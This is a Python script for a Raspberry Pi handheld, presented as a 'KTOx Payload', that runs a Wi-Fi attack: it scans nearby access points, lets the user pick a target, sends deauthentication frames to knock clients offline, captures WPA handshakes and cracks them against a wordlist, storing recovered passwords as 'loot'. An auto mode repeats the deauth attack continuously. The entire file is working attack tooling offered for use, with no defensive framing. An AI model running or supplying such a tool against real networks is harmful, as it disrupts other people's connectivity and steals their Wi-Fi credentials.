#!/usr/bin/env python3
"""
KTOx Payload – KTOxGOTCHI (Full Version)
==========================================
Author: wickednull

- Manual target selection (UP/DOWN, OK to attack)
- Auto-deauth toggle (KEY1) for continuous attack
- Handshake capture and optional cracking
- Saves handshakes and cracked passwords to loot
- Proper cleanup on exit (disables monitor mode, kills processes)

Controls:
  UP/DOWN   – select AP in target list
  OK        – attack selected target
  KEY1      – toggle auto-deauth mode (continuous)
  KEY2      – show handshake log / cracked passwords
  KEY3      – exit (cleanup monitor mode)
"""

import os
import sys
import time
import threading
import subprocess
import random
import re
import signal
from datetime import datetime

# ----------------------------------------------------------------------
# Hardware & LCD
# ----------------------------------------------------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("KTOx hardware not found")
    sys.exit(1)

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
W, H = 128, 128

def font(size=9):
    try:
        return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", size)
    except:
        return ImageFont.load_default()

f9 = font(9)
f11 = font(11)

# ----------------------------------------------------------------------
# Global state
# ----------------------------------------------------------------------
handshake_count = 0
cracked_count = 0
ap_count = 0
client_count = 0
mood = "normal"
console_msg = "Starting..."
running = True
interface = None
networks = []
selected_idx = 0
auto_deauth = False
attack_thread = None
attack_stop = threading.Event()
scan_stop = threading.Event()

# Loot directories
LOOT_DIR = "/root/KTOx/loot/Handshakes"
CRACKED_DIR = "/root/KTOx/loot/CrackedWPA"
os.makedirs(LOOT_DIR, exist_ok=True)
os.makedirs(CRACKED_DIR, exist_ok=True)

WORDLIST = "/usr/share/wordlists/rockyou.txt"
if not os.path.exists(WORDLIST):
    WORDLIST = "/usr/share/john/password.lst"

faces = {
    "normal":   "(◕‿‿◕)",
    "happy":    "(◕‿‿◕)",
    "attacking": "(⌐■_■)",
    "lost":     "(X\\/X)",
    "assoc":    "(°▃▃°)",
    "excited":  "(☼‿‿☼)",
    "missed":   "(☼/\\☼)",
    "searching": "(ಠ_↼ )"
}

def set_mood(new_mood):
    global mood
    mood = new_mood
    if new_mood in ("attacking", "assoc", "lost", "missed", "searching"):
        threading.Timer(2.0, lambda: set_mood("normal") if mood == new_mood else None).start()
    elif new_mood == "happy":
        threading.Timer(4.0, lambda: set_mood("normal") if mood == new_mood else None).start()

# ----------------------------------------------------------------------
# WiFi helpers (using aircrack-ng suite)
# ----------------------------------------------------------------------
def run_cmd(cmd, timeout=None):
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
        stdout, stderr = proc.communicate(timeout=timeout)
        return stdout.decode("utf-8") + stderr.decode("utf-8")
    except:
        return ""

def enable_monitor_mode():
    global interface
    run_cmd("airmon-ng check kill")
    for iface in ["wlan1", "wlan0"]:
        if os.path.exists(f"/sys/class/net/{iface}"):
            interface = iface
            break
    if not interface:
        return False
    run_cmd(f"ip link set {interface} down")
    run_cmd(f"iw dev {interface} set type monitor")
    run_cmd(f"ip link set {interface} up")
    run_cmd(f"airmon-ng start {interface}")
    mon = f"{interface}mon"
    if os.path.exists(f"/sys/class/net/{mon}"):
        interface = mon
    return True

def disable_monitor_mode():
    # Kill any lingering airodump/aireplay processes
    run_cmd("pkill -f airodump-ng")
    run_cmd("pkill -f aireplay-ng")
    run_cmd("airmon-ng stop wlan0mon 2>/dev/null")
    run_cmd("airmon-ng stop wlan1mon 2>/dev/null")
    run_cmd("ip link set wlan0 down 2>/dev/null")
    run_cmd("iw dev wlan0 set type managed 2>/dev/null")
    run_cmd("ip link set wlan0 up 2>/dev/null")
    run_cmd("systemctl restart NetworkManager")

def scan_networks(timeout=12):
    global ap_count, networks
    tmp = "/tmp/ktoxgotchi_scan"
    run_cmd(f"rm -f {tmp}*")
    proc = subprocess.Popen(
        f"timeout {timeout} airodump-ng --output-format csv -w {tmp} {interface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    proc.wait()
    time.sleep(1)
    nets = []
    csv_file = f"{tmp}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, errors="ignore") as f:
            content = f.read()
        if "Station MAC" in content:
            content = content.split("Station MAC")[0]
        lines = content.strip().split("\n")
        header_idx = -1
        for i, line in enumerate(lines):
            if "BSSID" in line and "ESSID" in line:
                header_idx = i
                break
        if header_idx >= 0:
            headers = [h.strip() for h in lines[header_idx].split(",")]
            try:
                col_bssid = headers.index("BSSID")
                col_ch = headers.index("channel")
                col_essid = headers.index("ESSID")
            except ValueError:
                return []
            for line in lines[header_idx+1:]:
                if not line.strip():
                    continue
                parts = [p.strip() for p in line.split(",")]
                if len(parts) <= max(col_bssid, col_ch, col_essid):
                    continue
                bssid = parts[col_bssid]
                if not re.match(r"([0-9A-Fa-f]{2}:){5}", bssid):
                    continue
                essid = parts[col_essid]
                if essid and essid != "(not associated)":
                    ch = parts[col_ch]
                    nets.append({
                        "bssid": bssid,
                        "essid": essid,
                        "channel": ch
                    })
    ap_count = len(nets)
    networks = nets
    return nets

def get_clients_for_ap(bssid, channel, timeout=6):
    tmp = f"/tmp/ktoxgotchi_clients_{bssid.replace(':', '_')}"
    run_cmd(f"rm -f {tmp}*")
    proc = subprocess.Popen(
        f"timeout {timeout} airodump-ng -c {channel} --bssid {bssid} -w {tmp} {interface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    proc.wait()
    time.sleep(1)
    clients = []
    csv_file = f"{tmp}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, errors="ignore") as f:
            content = f.read()
        if "Station MAC" in content:
            station_section = content.split("Station MAC")[1]
            for line in station_section.strip().split("\n"):
                if not line.strip():
                    continue
                parts = [p.strip() for p in line.split(",")]
                if parts and re.match(r"([0-9A-Fa-f]{2}:){5}", parts[0]):
                    clients.append(parts[0])
    global client_count
    client_count = len(clients)
    return clients

def capture_handshake(bssid, essid, channel, client_mac):
    global handshake_count, console_msg
    tmp = f"/tmp/ktoxgotchi_hs_{bssid.replace(':', '_')}"
    run_cmd(f"rm -f {tmp}*")
    proc = subprocess.Popen(
        f"airodump-ng -c {channel} --bssid {bssid} -w {tmp} {interface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(2)
    set_mood("attacking")
    console_msg = f"Deauth {client_mac[-6:]}"
    run_cmd(f"aireplay-ng --deauth 10 -a {bssid} -c {client_mac} {interface}")
    time.sleep(3)
    proc.terminate()
    time.sleep(1)
    cap_file = f"{tmp}-01.cap"
    if os.path.exists(cap_file):
        aircrack_out = run_cmd(f"aircrack-ng {cap_file} 2>/dev/null")
        if "handshake" in aircrack_out.lower():
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30] or "unknown"
            dest = os.path.join(LOOT_DIR, f"{safe_essid}_{bssid}_{ts}.cap")
            run_cmd(f"cp {cap_file} {dest}")
            with open(os.path.join(LOOT_DIR, "handshake_log.txt"), "a") as log:
                log.write(f"{ts} | {essid} | {bssid} | {dest}\n")
            handshake_count += 1
            set_mood("happy")
            console_msg = f"HS! Total: {handshake_count}"
            # Auto-crack if wordlist exists
            if os.path.exists(WORDLIST):
                crack_result = run_cmd(f"aircrack-ng -w {WORDLIST} {dest} 2>/dev/null")
                key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", crack_result)
                if key_match:
                    password = key_match.group(1)
                    cracked_file = os.path.join(CRACKED_DIR, f"{safe_essid}_{bssid}_{ts}.txt")
                    with open(cracked_file, "w") as cf:
                        cf.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\nDate: {datetime.now().isoformat()}\n")
                    global cracked_count
                    cracked_count += 1
                    console_msg = f"Cracked! {password[:8]}"
                    set_mood("excited")
            return True
    set_mood("normal")
    return False

def attack_target(bssid, essid, channel):
    console_msg = f"Attacking {essid[:12]}"
    set_mood("assoc")
    clients = get_clients_for_ap(bssid, channel, timeout=6)
    if not clients:
        console_msg = "No clients"
        set_mood("lost")
        return False
    client = random.choice(clients)
    return capture_handshake(bssid, essid, channel, client)

def attack_loop(bssid, essid, channel):
    while auto_deauth and not attack_stop.is_set():
        success = attack_target(bssid, essid, channel)
        if success:
            time.sleep(10)
        else:
            time.sleep(5)
        # Refresh AP list (optional)
        scan_networks(5)

# ----------------------------------------------------------------------
# LCD drawing and menu
# ----------------------------------------------------------------------
def draw_screen():
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill="#8B0000")
    d.text((4, 3), "KTOxGOTCHI", font=f9, fill="#FF3333")
    y = 20
    d.text((4, y), f"HS: {handshake_count}", font=f9, fill="#FFBBBB"); y += 12
    d.text((4, y), f"APs: {ap_count}", font=f9, fill="#FFBBBB"); y += 12
    d.text((4, y), f"CLI: {client_count}", font=f9, fill="#FFBBBB"); y += 12
    face_char = faces.get(mood, faces["normal"])
    try:
        face_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
    except:
        face_font = f11
    bbox = d.textbbox((0, 0), face_char, font=face_font)
    face_w = bbox[2] - bbox[0]
    face_x = (W - face_w) // 2
    d.text((face_x, 50), face_char, font=face_font, fill="#00FF00")
    d.text((4, H-30), console_msg[:23], font=f9, fill="#AAAAAA")
    d.rectangle((0, H-12, W, H), fill="#220000")
    d.text((4, H-10), "UP/DN OK K1=Auto K2=Log K3=Exit", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_target_list():
    if not networks:
        draw_screen()
        return
    net = networks[selected_idx]
    lines = [
        f"Target: {net['essid'][:16]}",
        f"BSSID: {net['bssid']}",
        f"Channel: {net['channel']}",
        f"Selected: {selected_idx+1}/{len(networks)}",
        "",
        "UP/DN OK to attack K3=back"
    ]
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill="#8B0000")
    d.text((4, 3), "SELECT TARGET", font=f9, fill="#FF3333")
    y = 20
    for line in lines:
        d.text((4, y), line[:23], font=f9, fill="#FFBBBB")
        y += 12
    d.rectangle((0, H-12, W, H), fill="#220000")
    d.text((4, H-10), "UP/DN OK K3=Back", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img, 0, 0)

def show_log():
    log_file = os.path.join(LOOT_DIR, "handshake_log.txt")
    lines = ["=== HANDSHAKE LOG ==="]
    if os.path.exists(log_file):
        with open(log_file, "r") as f:
            log_lines = f.readlines()[-5:]
            for line in log_lines:
                lines.append(line.strip()[:20])
    else:
        lines.append("No handshakes yet")
    cracked_files = [f for f in os.listdir(CRACKED_DIR) if f.endswith(".txt")]
    if cracked_files:
        lines.append("--- Cracked ---")
        for cf in cracked_files[-3:]:
            with open(os.path.join(CRACKED_DIR, cf), "r") as f:
                for line in f:
                    if "PASSWORD:" in line:
                        lines.append(line.strip())
                        break
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill="#004466")
    d.text((4, 3), "LOG", font=f9, fill="#FF3333")
    y = 20
    for line in lines[:7]:
        d.text((4, y), line[:23], font=f9, fill="#FFBBBB")
        y += 12
    d.rectangle((0, H-12, W, H), fill="#220000")
    d.text((4, H-10), "Any key to exit", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img, 0, 0)
    while True:
        if wait_btn(0.1) is not None:
            break
        time.sleep(0.05)

def wait_btn(timeout=0.1):
    start = time.time()
    while time.time() - start < timeout:
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                time.sleep(0.05)
                return name
        time.sleep(0.02)
    return None

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
def main():
    global running, auto_deauth, attack_thread, selected_idx, networks, attack_stop, console_msg

    if not enable_monitor_mode():
        img = Image.new("RGB", (W, H), "black")
        d = ImageDraw.Draw(img)
        d.text((4, 40), "Monitor mode failed", font=f9, fill="red")
        d.text((4, 55), "Check interface", font=f9, fill="white")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return

    console_msg = f"Monitor: {interface}"
    set_mood("normal")
    draw_screen()
    time.sleep(1)

    # Initial scan
    scan_networks(12)

    state = "main"
    held = {}
    last_scan = 0

    while running:
        now = time.time()
        if state == "main":
            draw_screen()
            btn = wait_btn(0.5)
            if btn == "KEY3":
                break
            elif btn == "KEY2":
                show_log()
            elif btn == "KEY1":
                auto_deauth = not auto_deauth
                console_msg = f"Auto: {'ON' if auto_deauth else 'OFF'}"
                draw_screen()
                time.sleep(0.5)
            elif btn == "OK":
                if networks:
                    state = "target_select"
                    draw_target_list()
            # Refresh scan every 15 seconds
            if now - last_scan > 15:
                last_scan = now
                scan_networks(10)
        elif state == "target_select":
            draw_target_list()
            btn = wait_btn(0.5)
            if btn == "KEY3":
                state = "main"
            elif btn == "UP":
                if networks:
                    selected_idx = (selected_idx - 1) % len(networks)
                    draw_target_list()
            elif btn == "DOWN":
                if networks:
                    selected_idx = (selected_idx + 1) % len(networks)
                    draw_target_list()
            elif btn == "OK" and networks:
                target = networks[selected_idx]
                state = "attacking"
                console_msg = f"Attacking {target['essid'][:12]}"
                draw_screen()
                attack_stop.clear()
                if auto_deauth:
                    attack_thread = threading.Thread(target=attack_loop, args=(target['bssid'], target['essid'], target['channel']), daemon=True)
                    attack_thread.start()
                else:
                    attack_target(target['bssid'], target['essid'], target['channel'])
                # After attack, return to main
                state = "main"
                scan_networks(10)
        time.sleep(0.05)

    # Cleanup
    attack_stop.set()
    if attack_thread and attack_thread.is_alive():
        attack_thread.join(timeout=1)
    disable_monitor_mode()
    LCD.LCD_Clear()
    GPIO.cleanup()
    os._exit(0)

if __name__ == "__main__":
    main()
